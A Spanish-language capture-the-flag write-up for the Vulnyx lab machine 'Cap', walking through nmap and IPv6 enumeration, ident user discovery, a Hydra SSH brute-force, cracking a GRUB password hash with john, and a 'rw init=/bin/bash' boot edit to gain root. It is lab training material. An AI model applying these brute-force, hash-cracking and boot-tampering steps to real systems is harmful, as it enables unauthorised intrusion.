---
layout: post
title: Cap - Vulnyx
---

# Writeup
![Cap]({{'/assets/img/Cap/cap.png' | relative_url}})

Vulnyx

----------------------------------------------------------------------------------------------

Iniciamos el escaneo con Nmap en busca de puertos expuestos y reconocer los sevicios que los ocupan, para posteriormente buscar vulnerabilidades.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.2.161 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-08 13:08 CEST
Initiating ARP Ping Scan at 13:08
Scanning 192.168.2.161 [1 port]
Completed ARP Ping Scan at 13:08, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:08
Scanning 192.168.2.161 [65535 ports]
Discovered open port 22/tcp on 192.168.2.161
Discovered open port 80/tcp on 192.168.2.161
Completed SYN Stealth Scan at 13:08, 0.41s elapsed (65535 total ports)
Nmap scan report for 192.168.2.161
Host is up, received arp-response (0.00012s latency).
Scanned at 2024-04-08 13:08:51 CEST for 0s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:04:D1:38 (Oracle VirtualBox virtual NIC)
```
```bash
❯ nmap -sCV -p22,80 192.168.2.161 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-08 13:09 CEST
Nmap scan report for cap (192.168.2.161)
Host is up (0.00019s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 08:00:27:04:D1:38 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Aqui solo aparece la pagina de apache por defecto y aqui estuve buen rato haciendo fuzzing y nada de nada, hasta que....
![apache-web]({{'/assets/img/Cap/apache-ini.png' | relative_url}})

Empiezo a buscar por **ipv6** 
```bash
❯ ping -6 -c1 ff02::1
PING ff02::1(ff02::1) 56 data bytes
64 bytes from fe80::a00:27ff:fe04:d138%enp3s0: icmp_seq=1 ttl=64 time=0.044 ms

--- ff02::1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.044/0.044/0.044/0.000 ms
```
<p>¿Qué es la dirección FF02 :: 1?
Grupo multicast de todos los nodos FF02::1: grupo multicast al que se unen todos los dispositivos con IPv6 habilitado. Los paquetes que se envían a este grupo son recibidos y procesados por todas las interfaces IPv6 en el enlace o en la red. Esto tiene el mismo efecto que una dirección de broadcast en IPv4.</p>
[Informacion sobre IPV6 - HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/pentesting-ipv6)

Una vez que ya tengo ubicada la ipv6 de la maquina victima, empiezo otro escaneo con Nmap.
```bash
❯ ping -I enp3s0 -c1 fe80::dd03:81a:8706:ce8e
ping: Warning: source address might be selected on device other than: enp3s0
PING fe80::dd03:81a:8706:ce8e(fe80::dd03:81a:8706:ce8e) from :: enp3s0: 56 data bytes
64 bytes from fe80::dd03:81a:8706:ce8e%enp3s0: icmp_seq=1 ttl=64 time=0.025 ms

--- fe80::dd03:81a:8706:ce8e ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.025/0.025/0.025/0.000 ms
```
En esta ocasion me descubre tambien el puerto **113 ident**
```bash
❯ nmap -p- --open -sS -T5 -vvv -n -Pn -6 fe80::a00:27ff:fe04:d138%enp3s0
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-08 13:54 CEST
Initiating ND Ping Scan at 13:54
Scanning fe80::a00:27ff:fe04:d138 [1 port]
Completed ND Ping Scan at 13:54, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:54
Scanning fe80::a00:27ff:fe04:d138 [65535 ports]
Discovered open port 113/tcp on fe80::a00:27ff:fe04:d138
Discovered open port 80/tcp on fe80::a00:27ff:fe04:d138
Discovered open port 22/tcp on fe80::a00:27ff:fe04:d138
Completed SYN Stealth Scan at 13:54, 0.73s elapsed (65535 total ports)
Nmap scan report for fe80::a00:27ff:fe04:d138
Host is up, received nd-response (0.000052s latency).
Scanned at 2024-04-08 13:54:35 CEST for 1s
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 64
80/tcp  open  http    syn-ack ttl 64
113/tcp open  ident   syn-ack ttl 64
MAC Address: 08:00:27:04:D1:38 (Oracle VirtualBox virtual NIC)
```
 Y con este enlace [https://book.hacktricks.xyz/v/es/network-services-pentesting/113-pentesting-ident](https://book.hacktricks.xyz/v/es/network-services-pentesting/113-pentesting-ident) me atasque, **nc y netcat** no funcionaban con ipv6 buscando instale **ncat** y si me funciono.
```bash
❯ ncat -6 -vn fe80::a00:27ff:fe04:d138%enp3s0 113
Ncat: Version 7.94 ( https://nmap.org/ncat )
Ncat: Connected to [fe80::a00:27ff:fe04:d138]:113.
113,53632
113,53632:USERID:UNIX:lucas
```
Lo lanzo y analizando el trafico con **wireshar** veo que comunican dos puertos **113 y 53632** lo escribo en la conexion que mantengo con ncat y obtengo un nombre de usuario.
![wireshark]({{'/assets/img/Cap/wireshark.png' | relative_url}})

Como la web no tiene nada y no veo mas por donde ir o que hacer, hago fuerza bruta sobre el protocolo **ssh** con el usuario **lucas**
```bash
❯ hydra 192.168.2.161 ssh -l lucas -P /usr/share/wordlists/rockyou.txt -f -t 10 -I
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-08 16:06:11
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 10 tasks per 1 server, overall 10 tasks, 14344399 login tries (l:1/p:14344399), ~1434440 tries per task
[DATA] attacking ssh://192.168.2.161:22/
[STATUS] 81.00 tries/min, 81 tries in 00:01h, 14344318 to do in 2951:31h, 10 active
[STATUS] 70.00 tries/min, 210 tries in 00:03h, 14344189 to do in 3415:17h, 10 active
[STATUS] 65.71 tries/min, 460 tries in 00:07h, 14343939 to do in 3637:58h, 10 active
[22][ssh] host: 192.168.2.161   login: lucas   password: c*******n
[STATUS] attack finished for 192.168.2.161 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```
Despues de un buen rato y un cafe, aparece una contraseña valida. Voy a conectarme.
```bash
❯ ssh lucas@192.168.2.161
The authenticity of host '192.168.2.161 (192.168.2.161)' can't be established.
ED25519 key fingerprint is SHA256:3dqq7f/jDEeGxYQnF2zHbpzEtjjY49/5PvV5/4MMqns.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:9: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.2.161' (ED25519) to the list of known hosts.
lucas@192.168.2.161's password: 
lucas@cap:~$ export TERM=xterm
lucas@cap:~$ ls
user.txt
lucas@cap:~$ cat user.txt 
2ae**************************37d
```
Bueno hasta aqui ha sido un buen viaje, pero ya se puede visualizar la flag de bajos privilegios, toca la escalada y convertirse en root. 
Con esto me quede un buen rato dando vueltas, ya que puede tener una manera de escalar privilegios [Escalada de privilegios de reinicio de Sudo](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-reboot-privilege-escalation/)
```bash
❯ ssh lucas@192.168.2.161
lucas@192.168.2.161's password: 
lucas@cap:~$ sudo -l
Matching Defaults entries for lucas on cap:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lucas may run the following commands on cap:
    (root) NOPASSWD: /usr/sbin/reboot
```
Nada funcionaba, busco y busco archivos con capacidad de lectura, aqui otro [enlace -> GRUB (GRand Unifier Bootloader) ](https://www.guia-ubuntu.com/index.php/GRUB). 
Donde un archivo **grub.cfg** puede contener la contraseña cifrada para entrar en grub como usruario root. 
```bash
lucas@cap:~$ find /boot -readable 2>/dev/null

/boot/grub/grub.cfg
```
Efectivamente, despues de tanto buscar y mirar, se ve un password.
```bash
### BEGIN /etc/grub.d/01_password ###
set superusers="root"
password_pbkdf2 root grub.pbkdf2.sha512.10000.E9D*****************************************************************************************************************************.****************************************************************************************************************************163E
### END /etc/grub.d/01_password ###
```
Lo copio y lo guardo en un archivo que nombro **'hash'** y hago fuerza bruta para ver si puedo obtener la contraseña en texto claro. 
Conseguido ya tengo la contraseña para acceder al grub.
```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=PBKDF2-HMAC-SHA512
Using default input encoding: UTF-8
Loaded 1 password hash (PBKDF2-HMAC-SHA512, GRUB2 / OS X 10.8+ [PBKDF2-SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 10000 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s******s         (?)     
1g 0:00:00:00 DONE (2024-04-08 16:47) 4.761g/s 3200p/s 3200c/s 3200C/s gracie..kelly
Use the "--show --format=PBKDF2-HMAC-SHA512" options to display all of the cracked passwords reliably
Session completed.
```
Una vez que he consiguido obtener la contraseña root para acceder al **grub** reiniciamos la maquina, cuando este la pantall azul en carga presionamos la tecla ***e***. 
Accedo a GNU GRUB y cambio donde pone **ro quiet** y escribo **rw init=/bin/bash**. Pulso F10 la maquina reinicia.
![grub-change]({{'/assets/img/Cap/grub-enter.png' | relative_url}})
![grub-change]({{'/assets/img/Cap/grug-change.png' | relative_url}})
![grub-change]({{'/assets/img/Cap/grub-binbash.png' | relative_url}})

Entro en una shell grub podria decir, introduzco usuario **root** y contraseña que previamente obtuve con **john**
![grub-root]({{'/assets/img/Cap/grub-root.png' | relative_url}})

Una ve aqui ya podemos visualizar la flag de maximos privilegios, no obstante si se quiere obtener una **shell bash** solo he de cambiar la contraseña de root. 
![shell-grub]({{'/assets/img/Cap/shell-grub.png' | relative_url}})
Volver a accerder a la maquina por ssh e ingresar la nueva contraseña que hemos puesto.
```bash
❯ ssh lucas@192.168.2.161
lucas@192.168.2.161's password: 
lucas@cap:~$ su root
Contraseña: 
root@cap:/home/lucas# whoami
root
root@cap:/home/lucas#
```

Espro que te pueda servir de ayuda. GRACIAS por venir.
